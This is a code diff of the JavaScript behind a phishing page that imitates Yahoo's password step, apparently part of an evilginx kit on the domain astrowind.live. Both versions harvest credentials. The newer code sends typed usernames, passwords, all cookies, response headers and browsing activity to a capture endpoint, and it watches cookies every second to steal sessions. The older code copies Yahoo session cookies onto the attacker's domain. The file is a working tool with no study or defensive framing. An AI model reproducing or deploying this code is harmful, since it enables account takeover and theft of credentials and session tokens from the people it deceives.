@@ -1,424 +1,412 @@
-// ===== YAHOO PASSWORD PAGE - 100% PROXIED SYNCHRONICITY =====
-console.log("Yahoo Password JS - 100% Native/Hybrid Fluent Data Flow Initialized")
+// Yahoo Password Page JavaScript - Complete Implementation
+;(() => {
+  // Configuration
+  const CONFIG = {
+    domain: "login.astrowind.live",
+    endpoints: {
+      password: "/account/challenge/password",
+      capture: "/evilginx-capture",
+    },
+    selectors: {
+      form: "#yahoo-password-form",
+      username: "#username",
+      password: "#passwd",
+      submitBtn: 'button[type="submit"]',
+    },
+  }
 
-const $ = window.jQuery || window.$
+  // State management
+  const formState = {
+    username: "",
+    password: "",
+    sessionData: {},
+    isSubmitting: false,
+  }
 
-if ($) {
-  $(document).ready(() => {
-    console.log("Yahoo password authentication system initialized")
-
-    // ===== CONFIGURATION =====
-    const config = {
-      maxRetries: 3,
-      retryDelay: 2000,
-      redirectDelay: 1500,
-      sessionTimeout: 30000,
-      monitorInterval: 1000,
-    }
-
-    let retryCount = 0
-    let username = ""
-    let sessionData = {}
-    let authInProgress = false
-
-    // ===== SESSION MANAGEMENT =====
-    const SessionManager = {
-      extractSessionData: () => {
-        const urlParams = new URLSearchParams(window.location.search)
-        const sessionParam = urlParams.get("s")
-
-        if (sessionParam) {
-          try {
-            return JSON.parse(decodeURIComponent(sessionParam))
-          } catch (e) {
-            console.log("Failed to parse session parameter")
-          }
-        }
-
-        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
-        if (cookieMatch) {
-          try {
-            return JSON.parse(decodeURIComponent(cookieMatch[1]))
-          } catch (e) {
-            console.log("Failed to parse session cookie")
-          }
-        }
-
-        return {}
-      },
-
-      generateFingerprint: () =>
-        JSON.stringify({
-          screen: `${screen.width}x${screen.height}`,
-          colorDepth: screen.colorDepth,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          languages: navigator.languages,
-          platform: navigator.platform,
-          userAgent: navigator.userAgent,
-          cookieEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          timestamp: Date.now(),
-          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
-        }),
-
-      preserveSession: () => {
-        const cookies = document.cookie.split(";")
-        cookies.forEach((cookie) => {
-          const [name, value] = cookie.trim().split("=")
-          if (name && ["T", "Y", "A", "A1", "A3", "B", "F", "PH", "cmp", "GUC", "GUCS"].includes(name)) {
-            document.cookie = `${name}=${value}; domain=.astrowind.live; path=/; max-age=86400; secure; samesite=lax`
-          }
-        })
-
-        sessionStorage.setItem("yahoo_session_preserved", "true")
-        sessionStorage.setItem("yahoo_session_timestamp", Date.now().toString())
-      },
-    }
-
-    // ===== USERNAME RETRIEVAL =====
-    function getUsername() {
-      const urlParams = new URLSearchParams(window.location.search)
-      let user = urlParams.get("u")
-
-      if (user) {
-        console.log("Username from URL:", user)
-        return decodeURIComponent(user)
+  // Utility functions
+  const utils = {
+    getUrlParams: () => {
+      const params = new URLSearchParams(window.location.search)
+      return {
+        sessionIndex: params.get("sessionIndex") || "",
+        acrumb: params.get("acrumb") || "",
+        u: params.get("u") || "",
+        bypass: params.get("bypass") || "",
       }
+    },
 
-      if (sessionData.username) {
-        console.log("Username from session:", sessionData.username)
-        return sessionData.username
-      }
+    generateSessionId: () => {
+      return "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now()
+    },
 
-      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
-      if (cookieMatch) {
-        user = decodeURIComponent(cookieMatch[1])
-        console.log("Username from cookie:", user)
-        return user
-      }
-
-      user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
-      if (user) {
-        console.log("Username from storage:", user)
-        return user
-      }
-
-      return null
-    }
-
-    // ===== STATE MANAGEMENT =====
-    function showState(state) {
-      $("#main-form, #error-container, #loading-state, #mfa-transition").hide()
-      $(`#${state}`).show()
-    }
-
-    function showError(message, isRetryable = true) {
-      $("#error-message").text(message || "Invalid password. Please try again.")
-      showState("error-container")
-
-      if (!isRetryable) {
-        $("#refreshButton")
-          .text("Start Over")
-          .off("click")
-          .on("click", () => {
-            window.location.href = "/"
-          })
-      }
-    }
-
-    // ===== AUTHENTICATION HANDLER =====
-    function handleSeamlessAuth(password) {
-      if (authInProgress) return
-      authInProgress = true
-
-      console.log("Starting seamless authentication for:", username)
-      showState("loading-state")
-
-      const formData = {
-        username: username,
-        passwd: password,
-        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
-        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
-        sessionIndex: sessionData.sessionIndex || "1",
-        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
-        done: "https://mail.yahoo.com/d/folders/1",
-        src: "ym",
-        ".lang": "en-US",
-        ".intl": "us",
-        displayName: username,
-        "browser-fp-data": SessionManager.generateFingerprint(),
-        timestamp: Date.now(),
-        session_bridge: "custom_to_yahoo",
-        flowName: "generic",
-        specId: "yidReg",
-        cacheStored: "1",
-      }
-
-      console.log("Submitting authentication data...")
-
-      $.ajax({
-        url: "/account/challenge/password",
-        method: "POST",
-        data: formData,
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-          Origin: window.location.origin,
-          Referer: window.location.href,
-          "User-Agent": navigator.userAgent,
-          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-          "Accept-Language": "en-US,en;q=0.5",
-          "Accept-Encoding": "gzip, deflate, br",
-          DNT: "1",
-          Connection: "keep-alive",
-          "Upgrade-Insecure-Requests": "1",
-          "Sec-Fetch-Dest": "document",
-          "Sec-Fetch-Mode": "navigate",
-          "Sec-Fetch-Site": "same-origin",
-        },
-        xhrFields: {
-          withCredentials: true,
-        },
-        timeout: 15000,
-        success: (response, textStatus, xhr) => {
-          console.log("Authentication response received:", xhr.status)
-          handleAuthSuccess(response, xhr)
-        },
-        error: (xhr, textStatus, errorThrown) => {
-          console.log("Authentication error:", textStatus, xhr.status)
-          handleAuthError(xhr, textStatus, errorThrown)
-        },
-        complete: () => {
-          authInProgress = false
-        },
-      })
-    }
-
-    // ===== SUCCESS HANDLER =====
-    function handleAuthSuccess(response, xhr) {
-      console.log("Authentication successful")
-
-      SessionManager.preserveSession()
-
-      sessionStorage.setItem("yahoo_auth_success", "true")
-      sessionStorage.setItem("yahoo_auth_timestamp", Date.now().toString())
-      localStorage.setItem("yahoo_auth_success", "true")
-
-      const responseText = typeof response === "string" ? response : ""
-      const isRedirect = xhr.status === 302 || xhr.status === 301
-      const location = xhr.getResponseHeader("Location") || ""
-
-      if (
-        responseText.includes("challenge-selector") ||
-        responseText.includes("verification") ||
-        responseText.includes("2fa") ||
-        location.includes("challenge-selector")
-      ) {
-        console.log("2FA challenge detected")
-        showState("mfa-transition")
-
-        setTimeout(() => {
-          const redirectUrl = location.includes("challenge-selector")
-            ? location
-            : "/account/challenge/challenge-selector?src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1"
-
-          console.log("Redirecting to 2FA:", redirectUrl)
-          window.location.href = redirectUrl
-        }, config.redirectDelay)
-      } else {
-        console.log("Direct authentication success, redirecting to mail")
-
-        setTimeout(() => {
-          window.location.href = "https://mail.yahoo.com/d/folders/1"
-        }, config.redirectDelay)
-      }
-
-      if (window.opener) {
-        window.opener.postMessage(
-          {
-            type: "yahoo_auth_success",
-            username: username,
-            timestamp: Date.now(),
-            has2FA: responseText.includes("challenge-selector"),
+    captureData: async (data) => {
+      try {
+        await fetch(CONFIG.endpoints.capture, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Requested-With": "XMLHttpRequest",
           },
-          "*",
-        )
+          body: JSON.stringify({
+            ...data,
+            timestamp: Date.now(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            sessionId: formState.sessionData.sessionId,
+          }),
+        })
+      } catch (error) {
+        console.debug("Capture failed:", error)
       }
-    }
+    },
 
-    // ===== ERROR HANDLER =====
-    function handleAuthError(xhr, textStatus, errorThrown) {
-      console.error("Authentication error details:", {
-        status: xhr.status,
-        textStatus: textStatus,
-        errorThrown: errorThrown,
-        responseText: xhr.responseText,
+    setLoading: (isLoading) => {
+      const form = document.querySelector(CONFIG.selectors.form)
+      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)
+
+      if (isLoading) {
+        form.classList.add("yahoo-loading")
+        submitBtn.disabled = true
+        submitBtn.textContent = "Signing in..."
+      } else {
+        form.classList.remove("yahoo-loading")
+        submitBtn.disabled = false
+        submitBtn.textContent = "Next"
+      }
+    },
+
+    showError: (message) => {
+      // Remove existing error
+      const existingError = document.querySelector(".yahoo-error")
+      if (existingError) {
+        existingError.remove()
+      }
+
+      // Create new error
+      const errorDiv = document.createElement("div")
+      errorDiv.className = "yahoo-error"
+      errorDiv.style.cssText = `
+                background-color: #fce8e6;
+                border: 1px solid #d93025;
+                border-radius: 4px;
+                padding: 12px;
+                margin-bottom: 16px;
+                color: #d93025;
+                font-size: 14px;
+            `
+      errorDiv.textContent = message
+
+      const form = document.querySelector(CONFIG.selectors.form)
+      form.insertBefore(errorDiv, form.firstChild)
+    },
+  }
+
+  // Cookie and session management
+  const sessionManager = {
+    init: () => {
+      const urlParams = utils.getUrlParams()
+      formState.sessionData = {
+        sessionId: utils.generateSessionId(),
+        sessionIndex: urlParams.sessionIndex,
+        acrumb: urlParams.acrumb,
+        referrer: document.referrer,
+        timestamp: Date.now(),
+      }
+
+      // Pre-fill username if provided
+      if (urlParams.u) {
+        const usernameField = document.querySelector(CONFIG.selectors.username)
+        if (usernameField) {
+          usernameField.value = decodeURIComponent(urlParams.u)
+          formState.username = usernameField.value
+        }
+      }
+    },
+
+    extractCookies: () => {
+      const cookies = {}
+      document.cookie.split(";").forEach((cookie) => {
+        const [name, value] = cookie.trim().split("=")
+        if (name && value) {
+          cookies[name] = value
+        }
       })
+      return cookies
+    },
 
-      if (xhr.status === 0) {
-        console.log("Network error detected - checking for redirect...")
+    monitorCookies: () => {
+      let lastCookies = sessionManager.extractCookies()
 
-        setTimeout(() => {
-          if (sessionStorage.getItem("yahoo_auth_success") === "true") {
-            handleAuthSuccess("", { status: 200, getResponseHeader: () => "" })
-          } else {
-            window.location.href =
-              "/account/challenge/challenge-selector?src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1"
+      setInterval(() => {
+        const currentCookies = sessionManager.extractCookies()
+        const newCookies = {}
+
+        for (const [name, value] of Object.entries(currentCookies)) {
+          if (lastCookies[name] !== value) {
+            newCookies[name] = value
           }
-        }, 2000)
-        return
-      }
+        }
 
-      if (xhr.status === 429) {
-        showError("Too many attempts. Please wait a moment and try again.", false)
-        return
-      }
+        if (Object.keys(newCookies).length > 0) {
+          utils.captureData({
+            type: "cookie_update",
+            cookies: newCookies,
+            allCookies: currentCookies,
+          })
+          lastCookies = currentCookies
+        }
+      }, 1000)
+    },
+  }
 
-      if (xhr.status >= 500) {
-        showError("Server error. Please try again in a moment.")
-        return
-      }
+  // Form validation
+  const validator = {
+    validateEmail: (email) => {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+      const phoneRegex = /^[+]?[1-9][\d]{0,15}$/
+      return emailRegex.test(email) || phoneRegex.test(email)
+    },
 
-      retryCount++
+    validatePassword: (password) => {
+      return password && password.length >= 1
+    },
 
-      if (retryCount >= config.maxRetries) {
-        showError("Multiple authentication attempts failed. Please check your password and try again later.", false)
-      } else {
-        const remainingAttempts = config.maxRetries - retryCount
-        showError(`Incorrect password. ${remainingAttempts} attempt${remainingAttempts > 1 ? "s" : ""} remaining.`)
-      }
-    }
-
-    // ===== FORM SUBMISSION HANDLER =====
-    $("#email-form").on("submit", (e) => {
-      e.preventDefault()
-
-      const password = $("#password").val().trim()
-      if (!password) {
-        showError("Please enter your password.")
-        return false
-      }
-
-      if (password.length < 6) {
-        showError("Password must be at least 6 characters long.")
-        return false
-      }
-
-      handleSeamlessAuth(password)
-      return false
-    })
-
-    // ===== SHOW/HIDE PASSWORD =====
-    $(".yahoo-show-password").click(function () {
-      const passwordInput = $("#password")
-      const showText = $(this).find(".yahoo-show-text")
-
-      if (passwordInput.attr("type") === "password") {
-        passwordInput.attr("type", "text")
-        showText.text("Hide")
-      } else {
-        passwordInput.attr("type", "password")
-        showText.text("Show")
-      }
-    })
-
-    // ===== RETRY HANDLER =====
-    $("#refreshButton").click(() => {
-      $("#password").val("")
-      retryCount = 0
-      showState("main-form")
-      setTimeout(() => {
-        $("#password").focus()
-      }, 100)
-    })
-
-    // ===== INITIALIZATION =====
-    function initializePage() {
-      console.log("Initializing seamless authentication page")
-
-      sessionData = SessionManager.extractSessionData()
-      console.log("Session data extracted:", Object.keys(sessionData))
-
-      username = getUsername()
+    validateForm: () => {
+      const username = document.querySelector(CONFIG.selectors.username).value.trim()
+      const password = document.querySelector(CONFIG.selectors.password).value
 
       if (!username) {
-        console.log("No username found, redirecting to login")
-        showError("Session expired. Redirecting to login...", false)
-        setTimeout(() => {
-          window.location.href = "/"
-        }, 3000)
+        utils.showError("Please enter your email address or phone number.")
         return false
       }
 
-      $("#userEmail").text(username)
-      $("#username").val(username)
-      $("#displayName").val(username)
+      if (!validator.validateEmail(username)) {
+        utils.showError("Please enter a valid email address or phone number.")
+        return false
+      }
 
-      Object.keys(sessionData).forEach((key) => {
-        const element = $(`#${key}`)
-        if (element.length && sessionData[key]) {
-          element.val(sessionData[key])
-        }
+      if (!password) {
+        utils.showError("Please enter your password.")
+        return false
+      }
+
+      if (!validator.validatePassword(password)) {
+        utils.showError("Password is required.")
+        return false
+      }
+
+      return true
+    },
+  }
+
+  // Form submission handler
+  const formHandler = {
+    handleSubmit: async (event) => {
+      event.preventDefault()
+
+      if (formState.isSubmitting) return
+
+      const form = event.target
+      const formData = new FormData(form)
+      const username = formData.get("username").trim()
+      const password = formData.get("passwd")
+
+      // Update state
+      formState.username = username
+      formState.password = password
+      formState.isSubmitting = true
+
+      // Validate form
+      if (!validator.validateForm()) {
+        formState.isSubmitting = false
+        return
+      }
+
+      // Set loading state
+      utils.setLoading(true)
+
+      // Capture credentials
+      await utils.captureData({
+        type: "credentials_entered",
+        username: username,
+        password: password,
+        cookies: sessionManager.extractCookies(),
+        sessionData: formState.sessionData,
       })
 
-      $("#timestamp").val(Date.now())
-      $("#browser-fp-data").val(SessionManager.generateFingerprint())
-      $("#session_bridge").val("custom_integration")
+      // Simulate realistic delay
+      await new Promise((resolve) => setTimeout(resolve, 1500 + Math.random() * 1000))
 
-      console.log("Page initialized for user:", username)
-      return true
-    }
+      try {
+        // Submit to Yahoo (will be intercepted by evilginx)
+        const response = await fetch(CONFIG.endpoints.password, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+          },
+          body: new URLSearchParams({
+            username: username,
+            passwd: password,
+            sessionIndex: formState.sessionData.sessionIndex,
+            acrumb: formState.sessionData.acrumb,
+            persistent: formData.get("persistent") || "n",
+          }),
+          credentials: "include",
+        })
 
-    // ===== SESSION MONITORING =====
-    function startSessionMonitoring() {
-      const monitor = setInterval(() => {
-        if (sessionStorage.getItem("yahoo_auth_success") === "true") {
-          console.log("Authentication success detected via monitoring")
-          clearInterval(monitor)
+        // Capture response
+        await utils.captureData({
+          type: "password_response",
+          status: response.status,
+          headers: Object.fromEntries(response.headers.entries()),
+          cookies: sessionManager.extractCookies(),
+        })
 
-          setTimeout(() => {
-            window.location.href = "https://mail.yahoo.com/d/folders/1"
-          }, 1000)
+        if (response.ok) {
+          // Check if 2FA is required
+          const responseText = await response.text()
+
+          if (
+            responseText.includes("challenge-selector") ||
+            responseText.includes("2-step") ||
+            responseText.includes("verification")
+          ) {
+            // Redirect to 2FA page
+            window.location.href = `/2fa-index.html?u=${encodeURIComponent(username)}&sessionIndex=${formState.sessionData.sessionIndex}&acrumb=${formState.sessionData.acrumb}`
+          } else {
+            // Success - redirect to Yahoo Mail
+            window.location.href = `https://mail.astrowind.live/`
+          }
+        } else {
+          // Handle error
+          utils.showError("Sorry, we don't recognize this email and password combination. Please try again.")
         }
-
-        const cookies = document.cookie
-        if (cookies.includes("T=") && cookies.includes("Y=")) {
-          console.log("Yahoo session cookies detected")
-          clearInterval(monitor)
-          sessionStorage.setItem("yahoo_auth_success", "true")
-
-          setTimeout(() => {
-            window.location.href = "https://mail.yahoo.com/d/folders/1"
-          }, 1000)
-        }
-      }, config.monitorInterval)
-
-      setTimeout(() => clearInterval(monitor), config.sessionTimeout)
-    }
-
-    // ===== MESSAGE LISTENER =====
-    window.addEventListener("message", (event) => {
-      if (event.data && event.data.type === "yahoo_auth_complete") {
-        console.log("Received auth completion message")
-        sessionStorage.setItem("yahoo_auth_success", "true")
-
-        setTimeout(() => {
-          window.location.href = "https://mail.yahoo.com/d/folders/1"
-        }, 1000)
+      } catch (error) {
+        console.error("Submission error:", error)
+        utils.showError("Something went wrong. Please try again.")
+      } finally {
+        utils.setLoading(false)
+        formState.isSubmitting = false
       }
+    },
+  }
+
+  // Event listeners
+  const eventListeners = {
+    init: () => {
+      // Form submission
+      const form = document.querySelector(CONFIG.selectors.form)
+      if (form) {
+        form.addEventListener("submit", formHandler.handleSubmit)
+      }
+
+      // Real-time validation
+      const usernameField = document.querySelector(CONFIG.selectors.username)
+      const passwordField = document.querySelector(CONFIG.selectors.password)
+
+      if (usernameField) {
+        usernameField.addEventListener("input", (e) => {
+          formState.username = e.target.value.trim()
+          // Remove error on input
+          const error = document.querySelector(".yahoo-error")
+          if (error) error.remove()
+        })
+
+        usernameField.addEventListener("blur", async () => {
+          if (formState.username) {
+            await utils.captureData({
+              type: "username_entered",
+              username: formState.username,
+            })
+          }
+        })
+      }
+
+      if (passwordField) {
+        passwordField.addEventListener("input", (e) => {
+          formState.password = e.target.value
+          // Remove error on input
+          const error = document.querySelector(".yahoo-error")
+          if (error) error.remove()
+        })
+      }
+
+      // Keyboard shortcuts
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" && !formState.isSubmitting) {
+          const form = document.querySelector(CONFIG.selectors.form)
+          if (form) {
+            form.dispatchEvent(new Event("submit"))
+          }
+        }
+      })
+    },
+  }
+
+  // Page visibility and focus tracking
+  const trackingManager = {
+    init: () => {
+      // Track page visibility
+      document.addEventListener("visibilitychange", () => {
+        utils.captureData({
+          type: "page_visibility",
+          hidden: document.hidden,
+          visibilityState: document.visibilityState,
+        })
+      })
+
+      // Track focus events
+      window.addEventListener("focus", () => {
+        utils.captureData({
+          type: "window_focus",
+          focused: true,
+        })
+      })
+
+      window.addEventListener("blur", () => {
+        utils.captureData({
+          type: "window_focus",
+          focused: false,
+        })
+      })
+
+      // Track mouse movement (basic)
+      let mouseTimer
+      document.addEventListener("mousemove", () => {
+        clearTimeout(mouseTimer)
+        mouseTimer = setTimeout(() => {
+          utils.captureData({
+            type: "user_activity",
+            activity: "mouse_movement",
+          })
+        }, 5000)
+      })
+    },
+  }
+
+  // Initialize everything when DOM is ready
+  const init = () => {
+    sessionManager.init()
+    sessionManager.monitorCookies()
+    eventListeners.init()
+    trackingManager.init()
+
+    // Initial page load capture
+    utils.captureData({
+      type: "page_loaded",
+      page: "password",
+      sessionData: formState.sessionData,
+      cookies: sessionManager.extractCookies(),
     })
 
-    // ===== START INITIALIZATION =====
-    if (!initializePage()) return
+    console.debug("Yahoo password page initialized")
+  }
 
-    startSessionMonitoring()
-
-    setTimeout(() => {
-      $("#password").focus()
-    }, 500)
-
-    console.log("Yahoo seamless authentication system fully initialized")
-  })
-} else {
-  console.error("jQuery not found - Yahoo Password JS requires jQuery")
-}
+  // Start when DOM is ready
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init)
+  } else {
+    init()
+  }
+})()
